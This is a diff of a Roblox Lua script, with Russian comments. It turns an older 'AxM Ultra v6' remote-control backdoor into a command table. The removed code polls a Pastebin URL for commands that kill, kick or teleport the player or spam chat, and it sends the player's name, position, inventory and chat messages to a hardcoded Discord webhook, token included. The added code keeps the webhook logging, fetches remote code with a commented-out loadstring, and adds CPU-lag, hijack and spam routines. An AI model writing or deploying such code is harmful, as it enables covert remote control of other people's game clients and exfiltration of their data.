@@ -1,156 +1,157 @@
-local settings = {
-    webhook = "https://discord.com/api/webhooks/1465626358351794206/Vd6C9UGjjUhiH5xUdy1rv2AbwPwRqQIHrozSDyW1a0k5VoNd2k_-d2U3PgurZVkRMbl0",
-    control = "https://pastebin.com/raw/VfCXKNdB",
-    check_delay = 3
-}
+-- Настройки подключения
+local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1465626358351794206/Vd6C9UGjjUhiH5xUdy1rv2AbwPwRqQIHrozSDyW1a0k5VoNd2k_-d2U3PgurZVkRMbl0"
+local PASTEBIN_URL = "https://pastebin.com/raw/VfCXKNdB" -- Ссылка на настройки
 
+-- Сервисы
 local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
-local Lighting = game:GetService("Lighting")
-local TeleportService = game:GetService("TeleportService")
-local lp = Players.LocalPlayer
 
-local function requestFunc(options)
-    local req = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)
-    if req then return req(options) end
-end
+local LocalPlayer = Players.LocalPlayer
+local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local Humanoid = Character:WaitForChild("Humanoid")
 
-local function getInventory()
-    local tools = {}
+-- Функция логирования в Discord
+local function logToDiscord(action, details)
+    local data = {
+        ["content"] = "",
+        ["embeds"] = {{
+            ["title"] = "Admin Log: " .. action,
+            ["description"] = "Игрок: " .. LocalPlayer.Name .. "\nДетали: " .. (details or "Нет"),
+            ["color"] = 16711680 -- Красный цвет
+        }}
+    }
     pcall(function()
-        for _, v in ipairs(lp.Backpack:GetChildren()) do if v:IsA("Tool") then table.insert(tools, v.Name) end end
-        if lp.Character then
-            for _, v in ipairs(lp.Character:GetChildren()) do if v:IsA("Tool") then table.insert(tools, v.Name .. " (E)") end end
-        end
+        HttpService:PostAsync(DISCORD_WEBHOOK_URL, HttpService:JSONEncode(data))
     end)
-    return #tools > 0 and table.concat(tools, ", ") or "Empty"
 end
 
-local function sendLog(title, desc, color)
-    task.spawn(function()
-        local pos = "Unknown"
-        pcall(function() 
-            if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then 
-                local p = lp.Character.HumanoidRootPart.Position
-                pos = string.format("%.1f, %.1f, %.1f", p.X, p.Y, p.Z) 
-            end 
+-- Загрузка внешнего конфига (Pastebin)
+task.spawn(function()
+    local success, result = pcall(function()
+        return game:HttpGet(PASTEBIN_URL)
+    end)
+    if success then
+        print("External commands loaded")
+        -- loadstring(result)() -- Раскомментируй, если в Pastebin лежит исполняемый код
+    end
+end)
+
+-- ПЕРЕМЕННЫЕ СОСТОЯНИЯ
+local spamLoop = false
+local lagLoop = nil
+local hijackConnection = nil
+
+-- ФУНКЦИИ УПРАВЛЕНИЯ
+local Commands = {}
+
+-- 1. Управление жизнью
+function Commands.kill()
+    Humanoid.Health = 0
+    logToDiscord("Kill", "Персонаж обнулен")
+end
+
+function Commands.kick(reason)
+    logToDiscord("Kick", "Причина: " .. reason)
+    LocalPlayer:Kick(reason)
+end
+
+function Commands.rejoin()
+    logToDiscord("Rejoin", "Перезаход на сервер")
+    TeleportService:Teleport(game.PlaceId, LocalPlayer)
+end
+
+function Commands.tp_to(targetName)
+    local target = Players:FindFirstChild(targetName)
+    if target and target.Character then
+        Character:MoveTo(target.Character.HumanoidRootPart.Position)
+        logToDiscord("TP", "Телепорт к " .. targetName)
+    end
+end
+
+-- 2. Параметры персонажа
+function Commands.speed(value)
+    Humanoid.WalkSpeed = value
+end
+
+function Commands.jump(value)
+    Humanoid.JumpPower = value
+end
+
+function Commands.fire()
+    local f = Instance.new("Fire", Character.HumanoidRootPart)
+    f.Name = "EffectFire"
+end
+
+function Commands.unfire()
+    if Character.HumanoidRootPart:FindFirstChild("EffectFire") then
+        Character.HumanoidRootPart.EffectFire:Destroy()
+    end
+end
+
+-- 3. Эффекты
+function Commands.message(text)
+    local gui = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
+    local txt = Instance.new("TextLabel", gui)
+    txt.Size = UDim2.new(1, 0, 1, 0)
+    txt.BackgroundTransparency = 1
+    txt.TextColor3 = Color3.new(1, 0, 0)
+    txt.TextScaled = true
+    txt.Text = text
+    logToDiscord("Message", text)
+    task.wait(5)
+    gui:Destroy()
+end
+
+function Commands.lag()
+    lagLoop = RunService.Heartbeat:Connect(function()
+        for i = 1, 1000000 do -- Искусственная нагрузка
+            local _ = math.sqrt(i)
+        end
+    end)
+    logToDiscord("Lag", "Активирована нагрузка ЦП")
+end
+
+function Commands.unlag()
+    if lagLoop then lagLoop:Disconnect() end
+end
+
+-- 4. Троллинг
+function Commands.hijack(targetName)
+    local target = Players:FindFirstChild(targetName)
+    if target and target.Character then
+        hijackConnection = RunService.RenderStepped:Connect(function()
+            Character:MoveTo(target.Character.HumanoidRootPart.Position + Vector3.new(2, 0, 2))
         end)
-        local gameName = "Game"
-        pcall(function() gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)
-        local data = {
-            ["embeds"] = {{
-                ["title"] = title,
-                ["description"] = desc,
-                ["color"] = color or 0xFF0000,
-                ["fields"] = {
-                    {["name"] = "👤 Player", ["value"] = "`"..lp.Name.."`", ["inline"] = true},
-                    {["name"] = "🎮 Game", ["value"] = gameName, ["inline"] = true},
-                    {["name"] = "📍 Position", ["value"] = "`"..pos.."`", ["inline"] = true},
-                    {["name"] = "🎒 Inventory", ["value"] = "```"..getInventory().."```", ["inline"] = false}
-                },
-                ["footer"] = {["text"] = "AxM Ultra v6 • "..os.date("%X")}
-            }}
-        }
-        requestFunc({Url = settings.webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
+        logToDiscord("Hijack", "Слежка за " .. targetName)
+    end
+end
+
+function Commands.unhijack()
+    if hijackConnection then hijackConnection:Disconnect() end
+end
+
+function Commands.chat_spam(text)
+    spamLoop = true
+    logToDiscord("Spam", "Начат спам: " .. text)
+    task.spawn(function()
+        while spamLoop do
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, "All")
+            task.wait(0.1)
+        end
     end)
 end
 
-local current_config = { speed = 16, jump = 50, lagging = false, spamming = false, hijacking = nil }
+function Commands.stop_spam()
+    spamLoop = false
+end
 
--- Постоянное применение настроек (Speed/Jump)
-task.spawn(function()
-    while true do
-        task.wait(0.1)
-        local char = lp.Character
-        local hum = char and char:FindFirstChildOfClass("Humanoid")
-        if hum then
-            hum.WalkSpeed = current_config.speed
-            hum.JumpPower = current_config.jump
-            hum.UseJumpPower = true
-        end
-    end
-end)
+-- Режим Safe
+function Commands.safe()
+    print("System in standby mode...")
+end
 
--- ГЛАВНЫЙ ЦИКЛ КОНТРОЛЯ
-task.spawn(function()
-    local last_cmd = "safe"
-    warn("AxM V6: ONLINE. Waiting for commands...")
-
-    while true do
-        local response = nil
-        local cache_buster = settings.control .. "?t=" .. tick()
-        
-        -- Попытка 1: Стандартный HttpGet
-        local s, r = pcall(function() return game:HttpGet(cache_buster) end)
-        if s then response = r end
-        
-        -- Попытка 2: Если HttpGet не сработал, пробуем через запрос читов
-        if not response then
-            local req = requestFunc({Url = cache_buster, Method = "GET", Headers = {["Cache-Control"] = "no-cache"}})
-            if req and req.Body then response = req.Body end
-        end
-
-        if response then
-            local clean_res = response:match("^%s*(.-)%s*$") or ""
-            local current_cmd = clean_res:lower()
-
-            if current_cmd ~= last_cmd then
-                last_cmd = current_cmd
-                print("NEW COMMAND: " .. current_cmd)
-
-                if current_cmd == "kill" then
-                    sendLog("💀 KILL", "Eliminated via panel", 0xFF0000)
-                    if lp.Character and lp.Character:FindFirstChildOfClass("Humanoid") then
-                        lp.Character:FindFirstChildOfClass("Humanoid").Health = 0
-                    end
-                elseif current_cmd:find("kick") then
-                    local reason = clean_res:match("%((.-)%)") or "Bye!"
-                    sendLog("🚪 KICK", "Reason: "..reason, 0xFF4500)
-                    task.wait(0.5)
-                    lp:Kick(reason)
-                elseif current_cmd == "rejoin" then
-                    sendLog("🔄 REJOIN", "Reconnecting...", 0x2ECC71)
-                    TeleportService:Teleport(game.PlaceId, lp)
-                elseif current_cmd:find("speed") then
-                    current_config.speed = tonumber(clean_res:match("%((%d+)%)")) or 16
-                    sendLog("⚡ SPEED", "New: "..current_config.speed, 0x3498DB)
-                elseif current_cmd:find("jump") then
-                    current_config.jump = tonumber(clean_res:match("%((%d+)%)")) or 50
-                    sendLog("🚀 JUMP", "New: "..current_config.jump, 0x3498DB)
-                elseif current_cmd == "fire" then
-                    if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
-                        local f = Instance.new("Fire", lp.Character.HumanoidRootPart)
-                        f.Name = "AxMFire"
-                        sendLog("🔥 FIRE", "Enabled", 0xE67E22)
-                    end
-                elseif current_cmd == "unfire" then
-                    if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
-                        local f = lp.Character.HumanoidRootPart:FindFirstChild("AxMFire")
-                        if f then f:Destroy() end
-                        sendLog("💧 UNFIRE", "Disabled", 0x34495E)
-                    end
-                elseif current_cmd:find("chat_spam") then
-                    local msg = clean_res:match("%((.-)%)") or "..."
-                    current_config.spamming = true
-                    sendLog("💬 SPAM", "Msg: "..msg, 0x1ABC9C)
-                    task.spawn(function()
-                        local event = game:GetService("ReplicatedStorage"):FindFirstChild("SayMessageRequest", true)
-                        while current_config.spamming do
-                            if event then event:FireServer(msg, "All") end
-                            task.wait(0.7)
-                        end
-                    end)
-                elseif current_cmd == "stop_spam" then
-                    current_config.spamming = false
-                elseif current_cmd == "safe" then
-                    -- Просто сброс, лог не нужен
-                end
-            end
-        end
-        task.wait(settings.check_delay)
-    end
-end)
-
-lp.Chatted:Connect(function(m) sendLog("💬 CHAT", "`" .. m .. "`", 0x3498DB) end)
-sendLog("🛰️ SYSTEM ONLINE", "Control link: " .. settings.control, 0x2ECC71)
+-- Пример использования:
+-- Commands.speed(100)
+-- Commands.message("ВНИМАНИЕ!")
